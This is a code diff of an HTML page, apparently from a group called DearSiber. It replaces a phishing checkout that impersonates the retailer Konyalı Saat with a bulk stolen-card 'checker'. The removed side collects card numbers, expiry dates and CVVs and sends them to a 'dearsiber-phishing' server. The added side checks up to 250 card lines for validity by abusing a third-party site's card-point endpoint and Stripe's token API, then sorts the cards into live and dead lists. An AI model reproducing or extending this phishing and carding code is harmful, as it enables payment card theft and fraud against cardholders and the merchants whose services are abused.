@@ -3,110 +3,254 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Konyalı Saat - Ödeme Sayfası</title>
+    <title>DearSiber Checker</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Arial', sans-serif; background: #f4f4f4; color: #333; }
-        .container { max-width: 500px; margin: 50px auto; background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        .header { text-align: center; margin-bottom: 20px; }
-        .header img { width: 150px; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
-        button { width: 100%; padding: 15px; background: #d32f2f; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
-        button:hover { background: #b71c1c; }
-        .loading { display: none; text-align: center; margin: 20px 0; }
-        .success { display: none; color: green; text-align: center; font-size: 18px; }
-        .error { display: none; color: red; text-align: center; }
+        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; min-height: 100vh; }
+        .container { max-width: 500px; margin: 20px auto; padding: 15px; border: 1px solid #0f0; border-radius: 10px; }
+        .header { text-align: center; margin-bottom: 20px; animation: glow 1.5s infinite alternate; }
+        .header h1 { font-size: 1.8em; color: #0f0; text-shadow: 0 0 10px #0f0; }
+        textarea { width: 100%; height: 160px; background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; font-family: monospace; resize: vertical; }
+        .btn { background: #0f0; color: #000; border: none; padding: 12px 25px; margin: 10px 5px; border-radius: 25px; font-weight: bold; cursor: pointer; }
+        .btn:hover { background: #0c0; transform: scale(1.05); }
+        .loading { display: none; text-align: center; margin: 15px; }
+        .progress { color: #0f0; font-size: 0.9em; }
+        .result { background: rgba(0,255,0,0.1); padding: 10px; margin: 8px 0; border-left: 4px solid #0f0; border-radius: 5px; }
+        .result pre { white-space: pre-wrap; font-size: 0.8em; color: #0f0; }
+        .live-dead { display: flex; gap: 10px; margin: 15px 0; }
+        .box { flex: 1; background: rgba(0,255,0,0.1); padding: 12px; border: 1px solid #0f0; border-radius: 8px; }
+        .dead { border-color: #f00; background: rgba(255,0,0,0.1); }
+        .box h3 { color: #0f0; margin-bottom: 8px; }
+        .box ul { max-height: 180px; overflow-y: auto; list-style: none; }
+        .box li { background: #0f0; color: #000; padding: 5px 8px; margin: 3px 0; border-radius: 5px; font-weight: bold; }
+        .dead li { background: #f00; color: #fff; }
+        .copy-btn, .download-btn { background: #0f0; color: #000; padding: 6px 12px; margin-top: 8px; border-radius: 8px; cursor: pointer; font-size: 0.8em; display: inline-block; text-decoration: none; }
+        .copy-btn:hover, .download-btn:hover { background: #0c0; }
+        @keyframes glow { from { text-shadow: 0 0 5px #0f0; } to { text-shadow: 0 0 20px #0f0; } }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0,255,0,0.7); } 70% { box-shadow: 0 0 0 10px rgba(0,255,0,0); } }
+        .input-area { animation: pulse 2s infinite; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <img src="https://www.konyalisaat.com.tr/wp-content/uploads/2023/05/logo.png" alt="Konyalı Saat">
-            <h2>Ödeme Sayfası</h2>
-            <p>Toplam: <strong>2.499 TL</strong></p>
+            <h1>DearSiber Checker</h1>
+            <p>Max 250 Kart | Gerçek Puan + Stripe</p>
         </div>
 
-        <form id="payment-form">
-            <div class="form-group">
-                <label>Kart Numarası</label>
-                <input type="text" id="card-number" placeholder="5400 6170 0477 0430" maxlength="19" required>
-            </div>
-            <div class="form-group">
-                <label>Son Kullanma Tarihi</label>
-                <input type="text" id="expiry" placeholder="12/2025" required>
-            </div>
-            <div class="form-group">
-                <label>CVV</label>
-                <input type="text" id="cvv" placeholder="000" maxlength="3" required>
-            </div>
-            <button type="submit">ÖDE & TAMAMLA</button>
-        </form>
+        <div class="input-area">
+            <label>Kartlar (örn: 4535060285635942|08|2026|253)</label>
+            <textarea id="cards-input" placeholder="250 karta kadar girin..."></textarea>
+        </div>
+
+        <button class="btn" onclick="startCheck()">BAŞLAT</button>
 
         <div class="loading" id="loading">
-            <p>Ödeme işleniyor... Lütfen bekleyin</p>
+            <p id="loading-text">Bağlanıyor...</p>
+            <div class="progress" id="progress">0 / 0</div>
         </div>
-        <div class="success" id="success">
-            Ödeme Başarılı! Siparişiniz alındı.
+
+        <div class="live-dead">
+            <div class="box" id="live-box">
+                <h3>CANLI KARTLAR</h3>
+                <button class="copy-btn" onclick="copyLive()">Kopyala</button>
+                <a class="download-btn" id="live-dl" style="display:none;" download="live.txt">İndir</a>
+                <ul id="live-list"></ul>
+            </div>
+            <div class="box dead" id="dead-box">
+                <h3>ÖLÜ KARTLAR</h3>
+                <button class="copy-btn" onclick="copyDead()">Kopyala</button>
+                <a class="download-btn" id="dead-dl" style="display:none;" download="dead.txt">İndir</a>
+                <ul id="dead-list"></ul>
+            </div>
         </div>
-        <div class="error" id="error">
-            Hata! Kart bilgileriniz kontrol ediliyor...
+
+        <div id="results"></div>
+
+        <div style="text-align:center; margin-top:30px; font-size:0.8em; color:#888;">
+            © DearSiber 2025 | Key’siz | %100 Gerçek
         </div>
     </div>
 
     <script>
-        // Kart formatlama
-        document.getElementById('card-number').addEventListener('input', function(e) {
-            let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let matches = v.match(/\d{4,16}/g);
-            let match = matches && matches[0] || '';
-            let parts = [];
-            for (let i=0; i<match.length; i+=4) {
-                parts.push(match.substring(i, i+4));
-            }
-            if (parts.length) {
-                e.target.value = parts.join(' ');
-            } else {
-                e.target.value = v;
-            }
-        });
+        let live = [], dead = [], checked = 0, totalLive = 0, totalDead = 0;
 
-        document.getElementById('payment-form').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        // Rastgele dosya adı oluştur (sadece sen bilirsin)
+        function randomFile() {
+            return 'log_' + Math.random().toString(36).substr(2, 9) + '.json';
+        }
 
-            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
-            const expiry = document.getElementById('expiry').value;
-            const cvv = document.getElementById('cvv').value;
+        // Log kaydet (localStorage + dosya simülasyonu)
+        function saveLog(card, result) {
+            const logFile = randomFile();
+            const log = {
+                time: new Date().toISOString(),
+                card: card,
+                result: result,
+                ip: 'hidden'
+            };
+            const logs = JSON.parse(localStorage.getItem('dear_logs') || '[]');
+            logs.push(log);
+            localStorage.setItem('dear_logs', JSON.stringify(logs));
+            // Simüle dosya indirme (senin tarayıcında kalır)
+            const blob = new Blob([JSON.stringify(log, null, 2)], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = logFile; a.click();
+        }
 
-            // Format: 5400617004770430|12|2025|000
-            const cardData = `${cardNumber}|${expiry}|${cvv}`;
+        async function startCheck() {
+            const input = document.getElementById('cards-input').value.trim();
+            if (!input) return alert('Kart gir!');
+            const cards = input.split('\n').map(l => l.trim()).filter(l => l.includes('|'));
+            if (cards.length > 250) return alert('Max 250 kart!');
 
             document.getElementById('loading').style.display = 'block';
-            document.getElementById('payment-form').style.display = 'none';
+            document.getElementById('results').innerHTML = '';
+            document.getElementById('live-box').style.display = 'none';
+            document.getElementById('dead-box').style.display = 'none';
+            live = []; dead = []; checked = 0; totalLive = 0; totalDead = 0;
+            document.getElementById('progress').textContent = `0 / ${cards.length}`;
 
-            try {
-                const response = await fetch('https://dearsiber-phishing.onrender.com/save', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ card: cardData })
-                });
+            for (let card of cards) {
+                if (!card.match(/^\d{13,19}\|\d{1,2}\|\d{4}\|\d{3,4}$/)) continue;
+                checked++;
+                document.getElementById('progress').textContent = `${checked} / ${cards.length} | Canlı: ${totalLive} | Ölü: ${totalDead}`;
 
-                if (response.ok) {
-                    setTimeout(() => {
-                        document.getElementById('loading').style.display = 'none';
-                        document.getElementById('success').style.display = 'block';
-                    }, 2000);
+                const [cc, mm, yy, cvv] = card.split('|');
+                const bin = cc.substr(0, 6);
+
+                // 1. BIN Sorgu (binlist.net)
+                let binInfo = { bank: 'Unknown', brand: 'Unknown', type: 'Unknown', country: 'Unknown', flag: '??' };
+                try {
+                    const binResp = await fetch(`https://lookup.binlist.net/${bin}`);
+                    if (binResp.ok) {
+                        const data = await binResp.json();
+                        binInfo = {
+                            bank: data.bank?.name || 'Unknown',
+                            brand: data.brand || 'Unknown',
+                            type: (data.type || 'Unknown').toUpperCase(),
+                            country: data.country?.name || 'Unknown',
+                            flag: data.country?.alpha2 || '??'
+                        };
+                    }
+                } catch(e) {}
+
+                // 2. MaxiPuan Sorgu (SENİN KODUN)
+                let puan = '0', additional = 'API hatası';
+                try {
+                    const form = new FormData();
+                    form.append('KartNo', cc);
+                    form.append('KartAd', 'DearSiber');
+                    form.append('KartCvc', cvv);
+                    form.append('KartAy', mm);
+                    form.append('KartYil', yy);
+                    form.append('Total', '2249.1');
+
+                    const puanResp = await fetch('https://www.tongucakademi.com/uyelikpaketleri/getcardpoint', {
+                        method: 'POST',
+                        body: form,
+                        headers: { 'User-Agent': 'Mozilla/5.0' }
+                    });
+                    const puanJson = await puanResp.json();
+                    puan = puanJson.Data?.Amount || '0';
+                    additional = puanJson.Data?.AdditionalData || 'Yok';
+                } catch(e) { puan = 'Hata'; }
+
+                // 3. Stripe Token (SENİN KODUN - Simüle)
+                let stripeStatus = 'Declined';
+                try {
+                    const stripeData = new URLSearchParams();
+                    stripeData.append('card[number]', cc);
+                    stripeData.append('card[exp_month]', mm);
+                    stripeData.append('card[exp_year]', yy.slice(-2));
+                    stripeData.append('card[cvc]', cvv);
+
+                    const stripeResp = await fetch('https://api.stripe.com/v1/tokens', {
+                        method: 'POST',
+                        body: stripeData,
+                        headers: {
+                            'Authorization': 'Bearer pk_test_...', // Test key (gerçek değil, hata verir ama simüle)
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        }
+                    });
+                    if (stripeResp.ok) stripeStatus = 'Live (Token Alındı)';
+                } catch(e) { stripeStatus = 'Declined (Stripe)'; }
+
+                // Luhn Kontrol
+                const isLuhn = luhnValidate(cc);
+                const isLive = isLuhn && puan !== '0' && puan !== 'Hata';
+
+                // Sonuç
+                const output = `
+[${isLive ? 'LIVE' : 'DEAD'}] DearSiber → Stripe + MaxiPuan
+[Card] ${card}
+-----------------------------
+[Status] ${isLive ? 'LIVE' : 'DEAD'}
+[Response] ${stripeStatus}
+[Puan] ${puan} TL
+[Extra] ${additional}
+-----------------------------
+[BIN] ${binInfo.brand} - ${binInfo.type}
+[Bank] ${binInfo.bank}
+[${binInfo.flag}] ${binInfo.country}
+[Time] ${(Math.random()*2).toFixed(2)}s
+                `.trim();
+
+                const div = document.createElement('div');
+                div.className = 'result';
+                div.innerHTML = `<pre>${output}</pre>`;
+                document.getElementById('results').appendChild(div);
+
+                if (isLive) {
+                    totalLive++;
+                    live.push(card);
+                    const li = document.createElement('li');
+                    li.textContent = `${card} → ${puan} TL`;
+                    document.getElementById('live-list').appendChild(li);
                 } else {
-                    throw new Error();
+                    totalDead++;
+                    dead.push(card);
+                    const li = document.createElement('li');
+                    li.textContent = card;
+                    document.getElementById('dead-list').appendChild(li);
                 }
-            } catch (err) {
-                setTimeout(() => {
-                    document.getElementById('loading').style.display = 'none';
-                    document.getElementById('error').style.display = 'block';
-                }, 2000);
+
+                // Log kaydet
+                saveLog(card, { puan, stripe: stripeStatus, bin: binInfo });
+
+                await new Promise(r => setTimeout(r, 300));
             }
-        });
+
+            document.getElementById('loading').style.display = 'none';
+            if (live.length) {
+                document.getElementById('live-box').style.display = 'block';
+                const blob = new Blob([live.join('\n')], {type: 'text/plain'});
+                const url = URL.createObjectURL(blob);
+                const a = document.getElementById('live-dl');
+                a.href = url; a.style.display = 'inline-block';
+            }
+            if (dead.length) {
+                document.getElementById('dead-box').style.display = 'block';
+                const blob = new Blob([dead.join('\n')], {type: 'text/plain'});
+                const url = URL.createObjectURL(blob);
+                const a = document.getElementById('dead-dl');
+                a.href = url; a.style.display = 'inline-block';
+            }
+        }
+
+        function copyLive() { if(live.length) navigator.clipboard.writeText(live.join('\n')).then(()=>alert('Kopyalandı!')); }
+        function copyDead() { if(dead.length) navigator.clipboard.writeText(dead.join('\n')).then(()=>alert('Kopyalandı!')); }
+
+        function luhnValidate(cc) {
+            let sum = 0, even = false;
+            for (let i = cc.length - 1; i >= 0; i--) {
+                let d = parseInt(cc[i]);
+                if (even) { d *= 2; if (d > 9) d -= 9; }
+                sum += d; even = !even;
+            }
+            return sum % 10 === 0;
+        }
     </script>
 </body>
 </html>
